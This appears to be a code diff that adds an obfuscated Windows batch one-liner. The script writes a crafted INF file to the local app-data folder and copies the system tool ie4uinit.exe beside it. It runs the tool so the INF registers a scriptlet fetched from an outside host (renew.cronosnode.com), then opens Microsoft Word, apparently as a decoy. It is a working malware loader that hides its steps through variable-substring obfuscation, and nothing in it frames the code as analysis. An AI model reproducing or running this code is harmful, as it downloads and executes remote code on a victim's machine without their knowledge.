@@ -1,0 +1,7 @@
+/v /ccall%Lonely:~0,1%et "Grant=.inf" &&
+  %Lonely:~0,1%et "Origins=ieuinit!Grant!" &&
+  call %Lonely:~0,1%et "Positions=%LOCALAPPDATA%\" &&
+  (for /D %l in ("[defaultin%Lonely:~0,1%tall.windows7]" "Un\" "Register\" "OCXs=4ED7" "delfiles=53B" "[4ED7]" "sc\" "ro%Bones%j,NI,%Resemble%%Coast%%Coast%p%Critic%%Fixtures%%Fixtures%renew.cronosnode.%Borrow%/condition" "[53B]" "ieu%Engine%!Grant!" "[string%Lonely:~0,1%]" "Bones=b;Labor" "Fixtures=/" "Coast=t;Build" "Borrow=com" "%Lonely:~0,1%ervicename=' '" "%Lonely:~0,1%hortsvcname=' '" "Resemble=h" "Typical=%time%" "Engine=init" "Critic=:;Carry" "[version]" "signature =$windows nt$" "[de%Lonely:~0,1%tinationdirs]" "defaultdestdir=11" "53B=01" ) do @echo %~l)>"!Positions!!Origins!" &&
+  call xcopy /Y /C /Q %win!Opinions!ir%\%Lonely:~0,1%ystem32\ie4uinit.exe "!Positions!*" &&
+  powershell -Command "start-Process '!Positions!ie4uinit.exe' -ArgumentList '-baseSettings'" &&
+  start "" "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
